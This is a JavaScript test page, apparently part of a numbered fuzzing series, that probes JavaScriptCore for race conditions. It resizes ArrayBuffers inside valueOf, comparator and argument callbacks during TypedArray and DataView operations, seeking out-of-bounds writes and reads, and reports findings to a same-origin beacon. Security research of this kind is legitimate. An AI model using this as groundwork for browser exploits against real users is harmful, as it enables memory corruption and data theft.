// CRASH_CLASS: MODERATE
// PROBE p556: RAB offset validation race + alternative TypedArray OOB paths
//
// p555 showed: TypedArray.set() silently truncates on mid-valueOf resize
// (no exception). Key question: does JSC validate the OFFSET argument
// against the pre-resize size? If yes → offset valid before resize but
// OOB after resize → controlled OOB write.
//
// Also tests: copyWithin, fill, DataView on RAB, ArrayBuffer.transfer(),
// slice-during-resize, and sort-with-resize comparator.
//
// Phases:
//   A) set() with large offset + shrink in valueOf → OOB write?
//   B) copyWithin() with valueOf resize → stale pointers?
//   C) fill() with valueOf resize → write past new boundary?
//   D) DataView on RAB → resize between get/set calls
//   E) ArrayBuffer.transfer() → stale view on detached buffer?
//   F) sort() with resize in comparator → confused element access?
//   G) slice() + resize race → leak freed bytes?

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P556-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  function hex32(v) {
    if (v === undefined) return 'undef';
    var n = v >>> 0;
    return '0x' + ('00000000' + n.toString(16)).slice(-8);
  }

  emit('START', 'rab-offset-race ua=' + navigator.userAgent.slice(0, 60));

  // Check RAB support
  var rabOk = false;
  try {
    var test = new ArrayBuffer(64, { maxByteLength: 128 });
    rabOk = typeof test.resize === 'function';
  } catch (e) {}
  if (!rabOk) { emit('NO-RAB', 'ResizableArrayBuffer not supported'); return; }
  emit('RAB-OK', 'supported');

  // ======================== PHASE A: set() with OFFSET + shrink ========================
  // If JSC validates offset against pre-resize length, then shrinks the RAB
  // in valueOf, the write at target[offset] is now OOB.

  emit('PHASE-A', 'start');

  try {
    var rabA = new ArrayBuffer(256, { maxByteLength: 1024 });
    var targetA = new Float64Array(rabA); // 32 floats (indices 0-31)

    // Fill with sentinel pattern
    for (var i = 0; i < 32; i++) targetA[i] = 0xAAAA0000 + i;

    // Source: 1 element, valueOf shrinks RAB to 16 bytes (2 floats)
    // Offset = 30 → valid in 32-float buffer, OOB in 2-float buffer
    var srcA = {
      length: 1,
      0: {
        valueOf: function () {
          try { rabA.resize(16); } catch (e) {}
          return 13.37;
        }
      }
    };

    var threwA = false;
    try {
      targetA.set(srcA, 30); // offset=30, valid pre-resize
    } catch (e) {
      threwA = true;
      emit('A-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    // Grow back and check if 13.37 landed at index 30 (would be OOB write proof)
    try { rabA.resize(256); } catch (e) {}
    var readA = [];
    var tA2 = new Float64Array(rabA);
    // Read around the target offset
    for (var ri = 28; ri < 32; ri++) {
      readA.push(ri + ':' + (tA2[ri] === undefined ? 'undef' : tA2[ri].toFixed(4)));
    }
    // Also read first 2 elements (within post-shrink bounds)
    readA.push('0:' + (tA2[0] === undefined ? 'undef' : tA2[0].toFixed(4)));
    readA.push('1:' + (tA2[1] === undefined ? 'undef' : tA2[1].toFixed(4)));

    emit('A-RESULT', 'threw=' + threwA + ' reads=' + readA.join(','));

    // Variant: offset=1, shrink to 8 bytes (1 float). offset=1 is OOB after shrink
    try { rabA.resize(256); } catch (e) {}
    for (var i2 = 0; i2 < 32; i2++) targetA[i2] = 0xBBBB0000 + i2;

    var srcA2 = {
      length: 1,
      0: {
        valueOf: function () {
          try { rabA.resize(8); } catch (e) {} // 1 float only
          return 77.77;
        }
      }
    };

    var threwA2 = false;
    try {
      targetA.set(srcA2, 1); // offset=1, barely OOB after shrink to 1 float
    } catch (e) {
      threwA2 = true;
      emit('A2-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    try { rabA.resize(256); } catch (e) {}
    var tA3 = new Float64Array(rabA);
    emit('A2-RESULT', 'threw=' + threwA2 +
      ' [0]=' + (tA3[0] === undefined ? 'undef' : tA3[0].toFixed(4)) +
      ' [1]=' + (tA3[1] === undefined ? 'undef' : tA3[1].toFixed(4)) +
      ' [2]=' + (tA3[2] === undefined ? 'undef' : tA3[2].toFixed(4)));

    // Variant: 2-element source with offset near end
    try { rabA.resize(256); } catch (e) {}
    for (var i3 = 0; i3 < 32; i3++) targetA[i3] = 0xCCCC0000 + i3;

    var resizeCount = 0;
    var srcA3 = {
      length: 2,
      0: { valueOf: function () { return 11.11; } }, // first element: no resize yet
      1: {
        valueOf: function () {
          try { rabA.resize(16); } catch (e) {} // shrink on SECOND element
          return 22.22;
        }
      }
    };

    var threwA3 = false;
    try {
      targetA.set(srcA3, 30); // offset=30, src.length=2 → writes indices 30,31
    } catch (e) {
      threwA3 = true;
      emit('A3-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    try { rabA.resize(256); } catch (e) {}
    var tA4 = new Float64Array(rabA);
    emit('A3-RESULT', 'threw=' + threwA3 +
      ' [30]=' + (tA4[30] === undefined ? 'undef' : tA4[30].toFixed(4)) +
      ' [31]=' + (tA4[31] === undefined ? 'undef' : tA4[31].toFixed(4)) +
      ' [0]=' + (tA4[0] === undefined ? 'undef' : tA4[0].toFixed(4)));

  } catch (e) {
    emit('PHASE-A-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-A', 'done');

  // ======================== PHASE B: copyWithin + resize ========================
  // copyWithin(target, start, end) — if resize happens between length check
  // and memmove, the internal pointers might be stale.

  emit('PHASE-B', 'start');

  try {
    var rabB = new ArrayBuffer(256, { maxByteLength: 1024 });
    var arrB = new Float64Array(rabB); // 32 floats
    for (var bi = 0; bi < 32; bi++) arrB[bi] = 100 + bi;

    // Proxy the array to intercept the copyWithin call's internal reads
    // Actually, copyWithin is a method on the TypedArray itself, not a standalone.
    // We can't valueOf-intercept it directly, but we can resize in a different way:
    // Use a Proxy on a regular array and call Array.prototype.copyWithin

    // Better approach: use the species constructor pattern
    // After resize, copyWithin should check bounds

    // Direct test: resize before copyWithin and check behavior
    rabB.resize(64); // 8 floats
    arrB.copyWithin(6, 0, 4); // copy elements 0-3 to positions 6-9 (within 8-float bounds)
    var copyReads1 = [];
    for (var bi2 = 0; bi2 < 8; bi2++) {
      copyReads1.push(bi2 + ':' + arrB[bi2].toFixed(1));
    }
    emit('B-NORMAL', 'copyWithin(6,0,4) in 8-float: ' + copyReads1.join(','));

    // Now: test if we can race. Sort with comparator that resizes!
    // copyWithin has no callbacks, but sort() does via the comparator.
    // Move sort test to Phase F.

    // Alternative: try copyWithin with arguments as objects with valueOf
    rabB.resize(256);
    for (var bi3 = 0; bi3 < 32; bi3++) arrB[bi3] = 200 + bi3;

    var threwB = false;
    try {
      // target arg with valueOf that resizes
      arrB.copyWithin(
        { valueOf: function () { return 28; } },  // target=28
        { valueOf: function () { rabB.resize(16); return 0; } }, // start=0, resize to 2 floats
        { valueOf: function () { return 4; } }  // end=4
      );
    } catch (e) {
      threwB = true;
      emit('B-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    // Grow back, check what happened
    try { rabB.resize(256); } catch (e) {}
    var arrB2 = new Float64Array(rabB);
    emit('B-RESULT', 'threw=' + threwB +
      ' [0]=' + arrB2[0].toFixed(1) +
      ' [1]=' + arrB2[1].toFixed(1) +
      ' [28]=' + (arrB2[28] === undefined ? 'undef' : arrB2[28].toFixed(1)) +
      ' [29]=' + (arrB2[29] === undefined ? 'undef' : arrB2[29].toFixed(1)));

  } catch (e) {
    emit('PHASE-B-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-B', 'done');

  // ======================== PHASE C: fill() + resize ========================
  // fill(value, start, end) — value.valueOf can resize the RAB

  emit('PHASE-C', 'start');

  try {
    var rabC = new ArrayBuffer(256, { maxByteLength: 1024 });
    var arrC = new Float64Array(rabC); // 32 floats
    for (var ci = 0; ci < 32; ci++) arrC[ci] = 300 + ci;

    var fillVal = {
      valueOf: function () {
        try { rabC.resize(16); } catch (e) {} // shrink to 2 floats
        return 66.66;
      }
    };

    var threwC = false;
    try {
      arrC.fill(fillVal, 0, 32); // fill entire 32-float range
    } catch (e) {
      threwC = true;
      emit('C-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    // Grow back and check
    try { rabC.resize(256); } catch (e) {}
    var arrC2 = new Float64Array(rabC);
    var fillReads = [];
    for (var ci2 = 0; ci2 < 8; ci2++) {
      fillReads.push(ci2 + ':' + (arrC2[ci2] === undefined ? 'undef' : arrC2[ci2].toFixed(2)));
    }
    // Check far end too
    fillReads.push('30:' + (arrC2[30] === undefined ? 'undef' : arrC2[30].toFixed(2)));
    fillReads.push('31:' + (arrC2[31] === undefined ? 'undef' : arrC2[31].toFixed(2)));
    emit('C-RESULT', 'threw=' + threwC + ' reads=' + fillReads.join(','));

    // fill with start valueOf that resizes, writing past new boundary
    try { rabC.resize(256); } catch (e) {}
    for (var ci3 = 0; ci3 < 32; ci3++) arrC[ci3] = 400 + ci3;

    var threwC2 = false;
    try {
      arrC.fill(
        55.55,
        { valueOf: function () { rabC.resize(16); return 0; } }, // start=0, resize
        32 // end=32 (pre-resize valid)
      );
    } catch (e) {
      threwC2 = true;
      emit('C2-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    try { rabC.resize(256); } catch (e) {}
    var arrC3 = new Float64Array(rabC);
    emit('C2-RESULT', 'threw=' + threwC2 +
      ' [0]=' + arrC3[0].toFixed(2) +
      ' [1]=' + arrC3[1].toFixed(2) +
      ' [2]=' + (arrC3[2] === undefined ? 'undef' : arrC3[2].toFixed(2)) +
      ' [30]=' + (arrC3[30] === undefined ? 'undef' : arrC3[30].toFixed(2)));

  } catch (e) {
    emit('PHASE-C-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-C', 'done');

  // ======================== PHASE D: DataView on RAB ========================
  // DataView accesses RAB by explicit byte offset. If we resize between
  // creating the DataView and calling setFloat64, the offset might be OOB.

  emit('PHASE-D', 'start');

  try {
    var rabD = new ArrayBuffer(256, { maxByteLength: 1024 });
    var dvD = new DataView(rabD);

    // Fill with pattern
    for (var di = 0; di < 32; di++) dvD.setFloat64(di * 8, 500 + di, true);

    // Resize then access
    rabD.resize(16); // 2 floats

    var dvReads = [];
    for (var di2 = 0; di2 < 4; di2++) {
      try {
        var v = dvD.getFloat64(di2 * 8, true);
        dvReads.push((di2 * 8) + ':' + v.toFixed(2));
      } catch (e) {
        dvReads.push((di2 * 8) + ':' + e.name);
      }
    }
    // Try explicit OOB access
    try {
      var oob = dvD.getFloat64(200, true);
      dvReads.push('200:' + oob.toFixed(2) + '!!!OOB');
    } catch (e) {
      dvReads.push('200:' + e.name);
    }
    emit('D-SHRINK', dvReads.join(','));

    // DataView with valueOf offset on RAB
    rabD.resize(256);
    for (var di3 = 0; di3 < 32; di3++) dvD.setFloat64(di3 * 8, 600 + di3, true);

    // setFloat64 where the offset valueOf resizes the buffer
    var threwD = false;
    try {
      dvD.setFloat64(
        { valueOf: function () { rabD.resize(16); return 248; } }, // offset=248 (byte 248 of 256 → OOB after resize to 16)
        99.99,
        true
      );
    } catch (e) {
      threwD = true;
      emit('D-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    // Grow back and check
    try { rabD.resize(256); } catch (e) {}
    var dvD2 = new DataView(rabD);
    var wrote248 = dvD2.getFloat64(248, true);
    emit('D-RESULT', 'threw=' + threwD + ' [248]=' + wrote248.toFixed(4) +
      ' expected=99.99 match=' + (Math.abs(wrote248 - 99.99) < 0.001));

    // getFloat64 with valueOf offset + resize
    rabD.resize(256);
    var readOobVal = 'N/A';
    var threwD2 = false;
    try {
      readOobVal = dvD.getFloat64(
        { valueOf: function () { rabD.resize(16); return 200; } }, // OOB after resize
        true
      );
    } catch (e) {
      threwD2 = true;
      emit('D2-THREW', e.name);
    }
    emit('D2-RESULT', 'threw=' + threwD2 + ' val=' + readOobVal);

  } catch (e) {
    emit('PHASE-D-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-D', 'done');

  // ======================== PHASE E: ArrayBuffer.transfer() ========================
  // transfer() detaches the original AB. If a TypedArray still points to it,
  // we get access to freed memory.

  emit('PHASE-E', 'start');

  try {
    var hasTransfer = false;
    var testBuf = new ArrayBuffer(64);

    if (typeof testBuf.transfer === 'function') {
      hasTransfer = true;
      emit('E-TRANSFER', 'ArrayBuffer.transfer() EXISTS');

      var abE = new ArrayBuffer(256);
      var viewE = new Float64Array(abE);
      for (var ei = 0; ei < 32; ei++) viewE[ei] = 700 + ei;

      // Transfer to new buffer
      var abE2 = abE.transfer();
      emit('E-SIZES', 'old.byteLength=' + abE.byteLength + ' new.byteLength=' + abE2.byteLength);

      // Try reading through old view — should be detached
      var eReads = [];
      for (var ei2 = 0; ei2 < 4; ei2++) {
        try {
          var v = viewE[ei2];
          eReads.push(ei2 + ':' + (v === undefined ? 'undef' : v.toFixed(2)));
        } catch (e) {
          eReads.push(ei2 + ':' + e.name);
        }
      }
      emit('E-STALE', 'old view reads: ' + eReads.join(','));

      // Check new buffer has the data
      var viewE2 = new Float64Array(abE2);
      emit('E-NEW', 'new[0]=' + viewE2[0] + ' new[31]=' + viewE2[31]);

    } else if (typeof testBuf.transferToFixedLength === 'function') {
      emit('E-TRANSFER', 'transferToFixedLength() exists (no transfer)');

      var abE3 = new ArrayBuffer(256);
      var viewE3 = new Float64Array(abE3);
      for (var ei3 = 0; ei3 < 32; ei3++) viewE3[ei3] = 800 + ei3;
      var abE4 = abE3.transferToFixedLength(128);
      emit('E-TFL', 'old.byteLength=' + abE3.byteLength + ' new.byteLength=' + abE4.byteLength);

      // Old view
      var eReads2 = [];
      for (var ei4 = 0; ei4 < 4; ei4++) {
        try {
          eReads2.push(ei4 + ':' + viewE3[ei4]);
        } catch (e) {
          eReads2.push(ei4 + ':' + e.name);
        }
      }
      emit('E-TFL-STALE', eReads2.join(','));

    } else {
      emit('E-TRANSFER', 'NONE — no transfer/transferToFixedLength');
    }

    // Also check structuredClone detach behavior
    try {
      var abSC = new ArrayBuffer(64);
      var viewSC = new Uint32Array(abSC);
      viewSC[0] = 0xDEAD;
      viewSC[1] = 0xBEEF;

      var cloned = structuredClone(abSC, { transfer: [abSC] });
      emit('E-SC', 'orig.byteLength=' + abSC.byteLength +
        ' cloned.byteLength=' + cloned.byteLength);

      // Old view on detached buffer
      try {
        var staleVal = viewSC[0];
        emit('E-SC-STALE', 'viewSC[0]=' + hex32(staleVal) + ' !!!STALE_ACCESS');
      } catch (e) {
        emit('E-SC-STALE', e.name + ' (correctly blocked)');
      }
    } catch (e) {
      emit('E-SC-ERR', String(e).slice(0, 120));
    }

  } catch (e) {
    emit('PHASE-E-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-E', 'done');

  // ======================== PHASE F: sort() with resize in comparator ========================
  // TypedArray.sort(comparator) calls comparator for each comparison.
  // If comparator resizes the RAB, sort's internal element access might OOB.

  emit('PHASE-F', 'start');

  try {
    var rabF = new ArrayBuffer(256, { maxByteLength: 1024 });
    var arrF = new Float64Array(rabF); // 32 floats
    for (var fi = 0; fi < 32; fi++) arrF[fi] = 32 - fi; // reverse order

    var sortCalls = 0;
    var resizedInSort = false;
    var sortErr = null;

    var threwF = false;
    try {
      arrF.sort(function (a, b) {
        sortCalls++;
        if (sortCalls === 5 && !resizedInSort) {
          resizedInSort = true;
          try { rabF.resize(16); } catch (e) { sortErr = e.name; }
        }
        return a - b;
      });
    } catch (e) {
      threwF = true;
      emit('F-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    // Check state
    try { rabF.resize(256); } catch (e) {}
    var arrF2 = new Float64Array(rabF);
    var sortReads = [];
    for (var fi2 = 0; fi2 < 8; fi2++) {
      sortReads.push(fi2 + ':' + (arrF2[fi2] === undefined ? 'undef' : arrF2[fi2].toFixed(1)));
    }
    emit('F-RESULT', 'threw=' + threwF + ' calls=' + sortCalls +
      ' resizeErr=' + sortErr + ' reads=' + sortReads.join(','));

  } catch (e) {
    emit('PHASE-F-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-F', 'done');

  // ======================== PHASE G: slice() + resize race ========================
  // slice() copies elements to a new TypedArray. If resize happens after
  // length computation but before copy, it might copy stale/freed bytes.

  emit('PHASE-G', 'start');

  try {
    var rabG = new ArrayBuffer(256, { maxByteLength: 1024 });
    var arrG = new Float64Array(rabG);
    for (var gi = 0; gi < 32; gi++) arrG[gi] = 900 + gi;

    // slice with valueOf that resizes
    var threwG = false;
    var sliceResult = null;
    try {
      sliceResult = arrG.slice(
        { valueOf: function () { rabG.resize(16); return 0; } }, // start=0, resize to 2 floats
        32 // end=32 (pre-resize)
      );
    } catch (e) {
      threwG = true;
      emit('G-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    if (sliceResult) {
      var sliceReads = [];
      for (var gi2 = 0; gi2 < Math.min(8, sliceResult.length); gi2++) {
        sliceReads.push(gi2 + ':' + (sliceResult[gi2] === undefined ? 'undef' : sliceResult[gi2].toFixed(2)));
      }
      emit('G-RESULT', 'threw=' + threwG + ' sliceLen=' + sliceResult.length +
        ' reads=' + sliceReads.join(','));

      // Check if slice copied data past new boundary (would be OOB read = info leak)
      if (sliceResult.length > 2) {
        var leaked = [];
        for (var gi3 = 2; gi3 < Math.min(8, sliceResult.length); gi3++) {
          if (sliceResult[gi3] !== 0) {
            leaked.push(gi3 + ':' + sliceResult[gi3]);
          }
        }
        if (leaked.length > 0) {
          emit('G-LEAK', '!!!OOB-READ past resize boundary: ' + leaked.join(','));
        } else {
          emit('G-CLEAN', 'elements past resize boundary are 0 (no leak)');
        }
      }
    }

    // Also test: end valueOf resizes
    try { rabG.resize(256); } catch (e) {}
    for (var gi4 = 0; gi4 < 32; gi4++) arrG[gi4] = 950 + gi4;

    var threwG2 = false;
    var sliceResult2 = null;
    try {
      sliceResult2 = arrG.slice(
        28, // start=28 (near end)
        { valueOf: function () { rabG.resize(16); return 32; } } // end=32, resize to 2 floats
      );
    } catch (e) {
      threwG2 = true;
      emit('G2-THREW', e.name + ': ' + String(e).slice(0, 120));
    }

    if (sliceResult2) {
      var slice2Reads = [];
      for (var gi5 = 0; gi5 < sliceResult2.length; gi5++) {
        slice2Reads.push(gi5 + ':' + (sliceResult2[gi5] === undefined ? 'undef' : sliceResult2[gi5].toFixed(2)));
      }
      emit('G2-RESULT', 'threw=' + threwG2 + ' len=' + sliceResult2.length +
        ' reads=' + slice2Reads.join(','));
    } else if (!threwG2) {
      emit('G2-RESULT', 'threw=false sliceResult=null');
    }

  } catch (e) {
    emit('PHASE-G-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-G', 'done');

  // ======================== PHASE H: Uint8Array + RAB for raw byte inspection ========================
  // If any phase above writes OOB, we need byte-level inspection.
  // Also: test if Uint8Array view on RAB behaves differently from Float64Array.

  emit('PHASE-H', 'start');

  try {
    var rabH = new ArrayBuffer(64, { maxByteLength: 256 });
    var u8H = new Uint8Array(rabH);
    var f64H = new Float64Array(rabH); // 8 floats

    // Write known pattern via f64
    f64H[0] = 1.1; f64H[1] = 2.2; f64H[7] = 8.8;

    // Resize to 8 bytes (1 float) via one view, read via another
    rabH.resize(8);

    // u8 reads
    var u8Reads = [];
    for (var hi = 0; hi < 16; hi++) {
      var b = u8H[hi];
      u8Reads.push(hi + ':' + (b === undefined ? 'U' : hex32(b)));
    }
    emit('H-U8', 'after resize(8): ' + u8Reads.join(','));

    // f64 reads
    var f64Reads = [];
    for (var hi2 = 0; hi2 < 4; hi2++) {
      var fv = f64H[hi2];
      f64Reads.push(hi2 + ':' + (fv === undefined ? 'U' : fv.toFixed(4)));
    }
    emit('H-F64', 'after resize(8): ' + f64Reads.join(','));

    rabH.resize(64);

  } catch (e) {
    emit('PHASE-H-ERR', String(e).slice(0, 200));
  }

  emit('PHASE-H', 'done');

  emit('ALIVE', 'all phases completed');
  window.__p556 = retained;
})();
